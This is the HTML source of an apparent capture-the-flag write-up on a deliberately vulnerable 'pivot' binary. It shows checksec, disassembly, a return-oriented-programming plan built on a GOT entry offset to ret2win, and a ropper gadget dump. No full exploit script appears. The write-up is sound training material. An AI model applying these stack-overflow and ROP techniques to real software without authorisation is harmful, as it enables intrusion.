&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/adamgold/Desktop/ctfs/pivot/pivot&amp;#39;&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0x400000&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
    RPATH:    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./&amp;#39;&lt;/span&gt;

pwndbg&amp;gt; disass main
Dump of assembler code &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; main:
   0x0000000000400996 &amp;lt;+0&amp;gt;:	push   rbp
   0x0000000000400997 &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x000000000040099a &amp;lt;+4&amp;gt;:	sub    rsp,0x10
   0x000000000040099e &amp;lt;+8&amp;gt;:	mov    rax,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rip+0x2016db&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 0x602080 &amp;lt;stdout@@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
   0x00000000004009a5 &amp;lt;+15&amp;gt;:	mov    ecx,0x0
   0x00000000004009aa &amp;lt;+20&amp;gt;:	mov    edx,0x2
   0x00000000004009af &amp;lt;+25&amp;gt;:	mov    esi,0x0
   0x00000000004009b4 &amp;lt;+30&amp;gt;:	mov    rdi,rax
   0x00000000004009b7 &amp;lt;+33&amp;gt;:	call   0x400870 &amp;lt;setvbuf@plt&amp;gt;
   0x00000000004009bc &amp;lt;+38&amp;gt;:	mov    rax,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rip+0x2016dd&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 0x6020a0 &amp;lt;stderr@@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
   0x00000000004009c3 &amp;lt;+45&amp;gt;:	mov    ecx,0x0
   0x00000000004009c8 &amp;lt;+50&amp;gt;:	mov    edx,0x2
   0x00000000004009cd &amp;lt;+55&amp;gt;:	mov    esi,0x0
   0x00000000004009d2 &amp;lt;+60&amp;gt;:	mov    rdi,rax
   0x00000000004009d5 &amp;lt;+63&amp;gt;:	call   0x400870 &amp;lt;setvbuf@plt&amp;gt;
   0x00000000004009da &amp;lt;+68&amp;gt;:	mov    edi,0x400b98
   0x00000000004009df &amp;lt;+73&amp;gt;:	call   0x400800 &amp;lt;puts@plt&amp;gt;
   0x00000000004009e4 &amp;lt;+78&amp;gt;:	mov    edi,0x400bae
   0x00000000004009e9 &amp;lt;+83&amp;gt;:	call   0x400800 &amp;lt;puts@plt&amp;gt;
   0x00000000004009ee &amp;lt;+88&amp;gt;:	mov    edi,0x1000000
   0x00000000004009f3 &amp;lt;+93&amp;gt;:	call   0x400860 &amp;lt;malloc@plt&amp;gt;
   0x00000000004009f8 &amp;lt;+98&amp;gt;:	mov    QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x8&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,rax
   0x00000000004009fc &amp;lt;+102&amp;gt;:	mov    rax,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x8&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x0000000000400a00 &amp;lt;+106&amp;gt;:	add    rax,0xffff00
   0x0000000000400a06 &amp;lt;+112&amp;gt;:	mov    QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,rax
   0x0000000000400a0a &amp;lt;+116&amp;gt;:	mov    rax,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x0000000000400a0e &amp;lt;+120&amp;gt;:	mov    rdi,rax
   0x0000000000400a11 &amp;lt;+123&amp;gt;:	call   0x400a3b &amp;lt;pwnme&amp;gt;
   0x0000000000400a16 &amp;lt;+128&amp;gt;:	mov    QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x10&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,0x0
   0x0000000000400a1e &amp;lt;+136&amp;gt;:	mov    rax,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x8&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x0000000000400a22 &amp;lt;+140&amp;gt;:	mov    rdi,rax
   0x0000000000400a25 &amp;lt;+143&amp;gt;:	call   0x4007f0 &amp;lt;free@plt&amp;gt;
   0x0000000000400a2a &amp;lt;+148&amp;gt;:	mov    edi,0x400bb6
   0x0000000000400a2f &amp;lt;+153&amp;gt;:	call   0x400800 &amp;lt;puts@plt&amp;gt;
   0x0000000000400a34 &amp;lt;+158&amp;gt;:	mov    eax,0x0
   0x0000000000400a39 &amp;lt;+163&amp;gt;:	leave
   0x0000000000400a3a &amp;lt;+164&amp;gt;:	ret
End of assembler dump.
pwndbg&amp;gt; disass pwnme
Dump of assembler code &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; pwnme:
   0x0000000000400a3b &amp;lt;+0&amp;gt;:	push   rbp
   0x0000000000400a3c &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x0000000000400a3f &amp;lt;+4&amp;gt;:	sub    rsp,0x30
   0x0000000000400a43 &amp;lt;+8&amp;gt;:	mov    QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x28&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,rdi
   0x0000000000400a47 &amp;lt;+12&amp;gt;:	lea    rax,&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x20&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x0000000000400a4b &amp;lt;+16&amp;gt;:	mov    edx,0x20
   0x0000000000400a50 &amp;lt;+21&amp;gt;:	mov    esi,0x0
   0x0000000000400a55 &amp;lt;+26&amp;gt;:	mov    rdi,rax
   0x0000000000400a58 &amp;lt;+29&amp;gt;:	call   0x400820 &amp;lt;memset@plt&amp;gt;
   0x0000000000400a5d &amp;lt;+34&amp;gt;:	mov    edi,0x400bc0
   0x0000000000400a62 &amp;lt;+39&amp;gt;:	call   0x400800 &amp;lt;puts@plt&amp;gt;
   0x0000000000400a67 &amp;lt;+44&amp;gt;:	mov    rax,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x28&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x0000000000400a6b &amp;lt;+48&amp;gt;:	mov    rsi,rax
   0x0000000000400a6e &amp;lt;+51&amp;gt;:	mov    edi,0x400be0
   0x0000000000400a73 &amp;lt;+56&amp;gt;:	mov    eax,0x0
   0x0000000000400a78 &amp;lt;+61&amp;gt;:	call   0x400810 &amp;lt;printf@plt&amp;gt;
   0x0000000000400a7d &amp;lt;+66&amp;gt;:	mov    edi,0x400c20
   0x0000000000400a82 &amp;lt;+71&amp;gt;:	call   0x400800 &amp;lt;puts@plt&amp;gt;
   0x0000000000400a87 &amp;lt;+76&amp;gt;:	mov    edi,0x400c52
   0x0000000000400a8c &amp;lt;+81&amp;gt;:	mov    eax,0x0
   0x0000000000400a91 &amp;lt;+86&amp;gt;:	call   0x400810 &amp;lt;printf@plt&amp;gt;
   0x0000000000400a96 &amp;lt;+91&amp;gt;:	mov    rdx,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rip+0x2015f3&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 0x602090 &amp;lt;stdin@@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
   0x0000000000400a9d &amp;lt;+98&amp;gt;:	mov    rax,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x28&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x0000000000400aa1 &amp;lt;+102&amp;gt;:	mov    esi,0x100
   0x0000000000400aa6 &amp;lt;+107&amp;gt;:	mov    rdi,rax
   0x0000000000400aa9 &amp;lt;+110&amp;gt;:	call   0x400840 &amp;lt;fgets@plt&amp;gt;
   0x0000000000400aae &amp;lt;+115&amp;gt;:	mov    edi,0x400c58
   0x0000000000400ab3 &amp;lt;+120&amp;gt;:	call   0x400800 &amp;lt;puts@plt&amp;gt;
   0x0000000000400ab8 &amp;lt;+125&amp;gt;:	mov    edi,0x400c52
   0x0000000000400abd &amp;lt;+130&amp;gt;:	mov    eax,0x0
   0x0000000000400ac2 &amp;lt;+135&amp;gt;:	call   0x400810 &amp;lt;printf@plt&amp;gt;
   0x0000000000400ac7 &amp;lt;+140&amp;gt;:	mov    rdx,QWORD PTR &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rip+0x2015c2&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;# 0x602090 &amp;lt;stdin@@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
   0x0000000000400ace &amp;lt;+147&amp;gt;:	lea    rax,&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp-0x20&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
   0x0000000000400ad2 &amp;lt;+151&amp;gt;:	mov    esi,0x40
   0x0000000000400ad7 &amp;lt;+156&amp;gt;:	mov    rdi,rax
   0x0000000000400ada &amp;lt;+159&amp;gt;:	call   0x400840 &amp;lt;fgets@plt&amp;gt;
   0x0000000000400adf &amp;lt;+164&amp;gt;:	nop
   0x0000000000400ae0 &amp;lt;+165&amp;gt;:	leave
   0x0000000000400ae1 &amp;lt;+166&amp;gt;:	ret
End of assembler dump.
pwndbg&amp;gt; disass uselessFunction
Dump of assembler code &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; uselessFunction:
   0x0000000000400ae2 &amp;lt;+0&amp;gt;:	push   rbp
   0x0000000000400ae3 &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x0000000000400ae6 &amp;lt;+4&amp;gt;:	mov    eax,0x0
   0x0000000000400aeb &amp;lt;+9&amp;gt;:	call   0x400850 &amp;lt;foothold_function@plt&amp;gt;
   0x0000000000400af0 &amp;lt;+14&amp;gt;:	mov    edi,0x1
   0x0000000000400af5 &amp;lt;+19&amp;gt;:	call   0x400880 &amp;lt;exit@plt&amp;gt;
End of assembler dump.

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;NX enabled, meaning we can not execute nothing on the stack. We have two stages of shellcode (also can be seen when running the binary) - First one uses &lt;code&gt;fgets&lt;/code&gt; and stores the input on previously allocated buffer, and the second one is vulnerable to buffer overflow.&lt;/p&gt;
&lt;p&gt;From the &lt;code&gt;uselessFunction&lt;/code&gt; disassembly, we can see that it just calls the &lt;code&gt;foothold_function&lt;/code&gt; from &lt;code&gt;libpivot.so&lt;/code&gt;. But &lt;code&gt;uselessFunction&lt;/code&gt; isnâ€™t called anywhere in the code, so in order to populate the &lt;code&gt;.got.plt&lt;/code&gt; entry, we have to first call the &lt;code&gt;foothold_function&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s design a basic plan:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Call the foothold_function to populate the .got.plt entry.&lt;/li&gt;
&lt;li&gt;Add the offset between &lt;code&gt;ret2win&lt;/code&gt; to &lt;code&gt;foothold_function&lt;/code&gt; to get our &lt;code&gt;ret2win&lt;/code&gt; function.&lt;/li&gt;
&lt;li&gt;Call it.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let&amp;rsquo;s get the &lt;code&gt;ret2win&lt;/code&gt; and &lt;code&gt;foothold_function&lt;/code&gt; addresses:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adamgold@adamgold-VirtualBox:~/Desktop/CTFs/pivot$ objdump -d ./libpivot.soÂ Â | grep ret2win

0000000000000abe :

adamgold@adamgold-VirtualBox:~/Desktop/CTFs/pivot$ objdump -d ./libpivot.soÂ Â | grep foothold_function

&lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000970&lt;/span&gt; :
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The offset:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pwndbg&amp;gt; p/x 0x0000000000000abe - 0x0000000000000970
$2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0x14e
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And the .got.plt address of &lt;code&gt;foothold_function&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Relocation section &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.rela.plt&amp;#39;&lt;/span&gt; at offset 0x6c8 contains &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; entries:

Â Â OffsetÂ Â Â Â Â Â Â Â Â Â InfoÂ Â Â Â Â Â Â Â Â Â Â TypeÂ Â Â Â Â Â Â Â Â Â Â Sym. ValueÂ Â Â Â Sym. Name + Addend

000000602018Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;000100000007&lt;/span&gt; R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; free@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602020Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;000300000007&lt;/span&gt; R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; puts@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602028Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;000400000007&lt;/span&gt; R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; printf@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602030Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;000500000007&lt;/span&gt; R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; memset@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602038Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;000600000007&lt;/span&gt; R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; __libc_start_main@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602040Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;000700000007&lt;/span&gt; R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; fgets@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602048Â Â &lt;span style=&#34;color:#ae81ff&#34;&gt;000900000007&lt;/span&gt; R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; foothold_function + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602050Â Â 000a00000007 R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; malloc@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602058Â Â 000b00000007 R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; setvbuf@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;

000000602060Â Â 000d00000007 R_X86_64_JUMP_SLO &lt;span style=&#34;color:#ae81ff&#34;&gt;0000000000000000&lt;/span&gt; exit@GLIBC_2.2.5 + &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;gadget-hunt&#34;&gt;Gadget Hunt&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;adamgold@adamgold-VirtualBox:~/Desktop/ctfs/pivot$ ropper --file pivot
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Load gadgets from cache
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;LOAD&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; loading... 100%
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;LOAD&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; removing double gadgets... 100%



Gadgets
&lt;span style=&#34;color:#f92672&#34;&gt;=======&lt;/span&gt;


0x0000000000400b7f: add bl, dh; ret;
0x0000000000400984: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax - 0x7b&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, cl; sal byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rcx + rsi*8 + 0x55&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, 0x48; mov ebp, esp; call rax;
0x0000000000400b7d: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add bl, dh; ret;
0x0000000000400982: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax - 0x7b&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, cl; sal byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rcx + rsi*8 + 0x55&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, 0x48; mov ebp, esp; call rax;
0x0000000000400b7b: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add bl, dh; ret;
0x00000000004008fc: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; pop rbp; ret;
0x0000000000400a35: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; leave; ret;
0x0000000000400a36: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add cl, cl; ret;
0x00000000004007cb: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add rsp, 8; ret;
0x0000000000400af3: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; call 0x880; nop word ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rax; ret;
0x0000000000400ad5: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; mov rdi, rax; call 0x840; nop; leave; ret;
0x0000000000400afe: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; pop rax; ret;
0x00000000004008fe: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; pop rbp; ret;
0x0000000000400b82: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; sub rsp, 8; add rsp, 8; ret;
0x00000000004008e8: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; test rax, rax; je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400936: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; test rax, rax; je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400983: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; test rax, rax; je 0x97b; push rbp; mov rbp, rsp; call rax;
0x0000000000400a37: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; leave; ret;
0x0000000000400afd: add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, r8b; pop rax; ret;
0x0000000000400a38: add cl, cl; ret;
0x0000000000400af1: add dword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, eax; add byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; call 0x880; nop word ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rax; ret;
0x0000000000400964: add eax, 0x20173e; add ebx, esi; ret;
0x0000000000400b0a: add eax, ebp; ret;
0x0000000000400969: add ebx, esi; ret;
0x00000000004007ce: add esp, 8; ret;
0x0000000000400b09: add rax, rbp; ret;
0x00000000004007cd: add rsp, 8; ret;
0x00000000004008f2: and byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, ah; jmp rax;
0x0000000000400967: and byte ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, al; add ebx, esi; ret;
0x0000000000400a25: call 0x7f0; mov edi, 0x400bb6; call 0x800; mov eax, 0; leave; ret;
0x0000000000400a2f: call 0x800; mov eax, 0; leave; ret;
0x0000000000400ada: call 0x840; nop; leave; ret;
0x0000000000400aeb: call 0x850; mov edi, 1; call 0x880; nop word ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rax; ret;
0x0000000000400af5: call 0x880; nop word ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rax; ret;
0x0000000000400995: call qword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp + 0x48&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;
0x000000000040098e: call rax;
0x0000000000400ca3: call rsp;
0x0000000000400b5c: fmul qword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax - 0x7d&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; ret;
0x00000000004008ed: je 0x900; pop rbp; mov edi, 0x602078; jmp rax;
0x000000000040093b: je 0x948; pop rbp; mov edi, 0x602078; jmp rax;
0x0000000000400988: je 0x97b; push rbp; mov rbp, rsp; call rax;
0x0000000000400d9b: jmp qword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;
0x0000000000400d5b: jmp qword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rdi&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;
0x0000000000400af9: jmp qword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rsi + 0xf&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;
0x00000000004008f5: jmp rax;
0x0000000000400961: lcall &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rbp - 0x3a&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; add eax, 0x20173e; add ebx, esi; ret;
0x0000000000400a34: mov eax, 0; leave; ret;
0x0000000000400b06: mov eax, dword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; ret;
0x000000000040098c: mov ebp, esp; call rax;
0x0000000000400a2a: mov edi, 0x400bb6; call 0x800; mov eax, 0; leave; ret;
0x00000000004008f0: mov edi, 0x602078; jmp rax;
0x0000000000400af0: mov edi, 1; call 0x880; nop word ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rax; ret;
0x0000000000400ad8: mov edi, eax; call 0x840; nop; leave; ret;
0x0000000000400ad2: mov esi, 0x40; mov rdi, rax; call 0x840; nop; leave; ret;
0x0000000000400b05: mov rax, qword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; ret;
0x000000000040098b: mov rbp, rsp; call rax;
0x0000000000400ad7: mov rdi, rax; call 0x840; nop; leave; ret;
0x0000000000400afb: nop dword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rax; ret;
0x00000000004008f8: nop dword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rbp; ret;
0x0000000000400945: nop dword ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rbp; ret;
0x0000000000400afa: nop word ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rax; ret;
0x00000000004008f7: nop word ptr &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;rax + rax&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; pop rbp; ret;
